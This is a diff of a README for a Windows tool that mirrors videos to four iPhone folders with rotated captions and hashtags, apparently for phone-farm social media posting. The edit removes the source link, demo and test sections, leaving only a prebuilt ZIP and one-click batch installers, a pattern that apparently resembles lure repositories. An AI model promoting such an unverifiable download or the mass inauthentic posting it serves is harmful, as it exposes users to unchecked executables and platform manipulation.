@@ -4,20 +4,19 @@ Local video file distribution and orchestration engine designed for mobile devic
 
 ---
 
-## Direct Download
+## Download
 
-- **Ready-to-use Package (.ZIP):** [Download fleetstream-core.zip](https://github.com/augdev1/fleetstream-core/raw/main/fleetstream-core.zip)
-- **Source Code (.ZIP):** [Download GitHub Repository ZIP](https://github.com/augdev1/fleetstream-core/archive/refs/heads/main.zip)
+- **FleetStream Client Package (.ZIP):** [Download fleetstream-core.zip](https://github.com/augdev1/fleetstream-core/raw/main/fleetstream-core.zip)
 
 ---
 
 ## Overview
 
-FleetStream eliminates media orchestration bottlenecks in automated multi-phone social media operations. It continuously monitors an incoming inbox folder, safely waits for file copies to stabilize, distributes or mirrors videos to your iPhone directories (`iphone_01` through `iphone_04`), and automatically generates paired `.json` metadata sidecars containing viral captions, hashtags, timestamps, and SHA-256 integrity verification for Tame.so.
+FleetStream eliminates media orchestration bottlenecks in automated multi-phone social media operations. It continuously monitors an incoming inbox folder, safely waits for file copies to stabilize, mirrors videos to all your iPhone directories (`iphone_01` through `iphone_04`), and automatically generates paired `.json` metadata sidecars containing viral captions, hashtags, timestamps, and SHA-256 integrity verification for Tame.so.
 
 ---
 
-## Complete Step-by-Step Tutorial (Windows)
+## Quick Setup Guide (Windows)
 
 No programming knowledge or command-line typing is required. The entire workflow operates through Windows Explorer and one-click batch scripts.
 
@@ -27,14 +26,11 @@ No programming knowledge or command-line typing is required. The entire workflow
 
 ### Step 2: Run Installer (`INSTALL.bat`)
 1. Open the extracted folder and double-click **`INSTALL.bat`**.
-2. **Automatic Python Setup:** You do not need to install Python manually. If Python is missing from your PC, `INSTALL.bat` will automatically download and configure standalone Python 3.12 and all required dependencies in an isolated `.venv` environment.
+2. **Automatic Python Setup:** Python is bundled and configured automatically. You do not need to install Python manually.
 3. Once finished, the terminal will display `[SUCCESS] FleetStream environment ready!`. Press any key to close the window.
 
-### Step 3: Test Installation (Optional)
-Double-click **`RUN_DEMO.bat`** to run a self-contained simulation. The script generates 8 test reels, processes them, and outputs a formatted terminal report confirming that video routing and `.json` sidecar generation are functional.
-
-### Step 4: Configure Settings (`config.json`)
-Open **`config.json`** using Notepad to customize your setup:
+### Step 3: Configure Settings (`config.json`)
+Open **`config.json`** using Notepad to customize your setup if needed:
 
 ```json
 {
@@ -72,18 +68,16 @@ Open **`config.json`** using Notepad to customize your setup:
 }
 ```
 
-#### Configuration Options:
-- **`mode`**:
-  - `"broadcast"` (Default): Copies every incoming video to **all 4 iPhones** with individual `.json` sidecars in each phone folder.
-  - `"round_robin"`: Divides videos evenly among the 4 iPhones (e.g., 4 videos = 1 per phone).
-- **`default_hashtags`**: Array of hashtags attached to the `.json` sidecars for your niche.
-- **`default_captions`**: Pool of viral captions rotated across distributed videos.
-- **`inbox_dir`**: Folder where you drop new videos.
-- **`devices_dir`**: Folder containing your iPhone subdirectories (`iphone_01` to `iphone_04`). If you use custom Tame.so sync paths, set them here.
+#### Settings Summary:
+- **`mode`**: `"broadcast"` (mirrors every video to all 4 iPhones) or `"round_robin"` (divides videos evenly).
+- **`default_hashtags`**: Custom hashtags attached to the `.json` sidecars.
+- **`default_captions`**: Pool of viral captions rotated across videos.
+- **`inbox_dir`**: Folder where you drop incoming videos.
+- **`devices_dir`**: Folder containing your iPhone subdirectories (`iphone_01` to `iphone_04`).
 
-### Step 5: Start the Service (`START_FLEETSTREAM.bat`)
+### Step 4: Start the Service (`START_FLEETSTREAM.bat`)
 1. Double-click **`START_FLEETSTREAM.bat`**.
-2. Keep the black terminal window open (or minimized) in the background. It will show:
+2. Keep the window open (or minimized) in the background. It will show:
    ```text
    [READY] Monitoring active. Waiting for incoming videos...
    ```
@@ -123,29 +117,6 @@ Each distributed video file (e.g., `clip_001.mp4`) generates an exact paired sid
     "orchestrator": "fleetstream"
   }
 }
-```
-
----
-
-## Key Engineering Features
-
-### 1. Write Stabilization and Lock Prevention
-When large video files are pasted or downloaded into the inbox, premature file operations cause `PermissionError` and corrupted transfers. FleetStream implements `wait_for_file_to_finish_copying`, continuously monitoring file size stability across consecutive intervals and verifying read accessibility before moving.
-
-### 2. Atomic Sidecar Serialization
-Metadata JSON files are serialized to temporary files (`.tmp_*.json`) before atomic renaming. This guarantees that Tame.so watchers on the iPhones never read half-written JSON files.
-
-### 3. Fault Tolerance
-Non-video extensions (such as `.txt`, `.pdf`, `.sh`) and temporary download files (`.part`, `.crdownload`, `.tmp`) are safely ignored, tracked as skipped items, and left in the inbox without interrupting the queue.
-
----
-
-## Automated Test Suite
-
-To run all 23 tests across unit, integration, and harness suites:
-
-```bash
-pytest -v
 ```
 
 ---
